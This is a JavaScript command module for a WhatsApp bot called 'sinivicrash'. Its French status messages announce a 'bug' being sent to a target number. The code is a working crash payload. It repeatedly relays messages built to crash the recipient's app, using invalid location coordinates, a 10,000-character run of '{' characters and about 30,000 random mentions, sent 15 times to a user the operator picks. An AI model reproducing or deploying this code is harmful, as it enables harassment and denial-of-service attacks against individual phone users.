import channelSender from "./channelSender.js";

async function bugfunc(client, targetNumber) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Peace and Love",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Peace and Love",
                address: "Peace and Love",
              },
            },
            body: { text: "Peace and Love" },
            nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
            contextInfo: {
              participant: targetNumber,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });
  } catch (err) {
    console.log(err);
  }
}

export const name = "sinivicrash";

export async function execute(sock, m, args) {
  try {
    let participant;

    // Si la commande répond à un message
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = m.message.extendedTextMessage.contextInfo.participant;
    } else if (args.length > 0) {
      participant = args[0].replace("@", "") + "@s.whatsapp.net";
    } else {
      await sock.sendMessage(m.key.remoteJid, { text: "⚠️ Mentionne ou donne le numéro de la cible." }, { quoted: m });
      return;
    }

    await sock.sendMessage(m.key.remoteJid, { text: "🚀 Envoi du bug en cours..." }, { quoted: m });

    for (let i = 0; i < 15; i++) {
      await bugfunc(sock, participant);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    await channelSender(m, sock, "✅ Bug envoyé avec succès.", 1);
  } catch (error) {
    await sock.sendMessage(m.key.remoteJid, { text: "❌ Erreur sinivicrash : " + error.message }, { quoted: m });
  }
}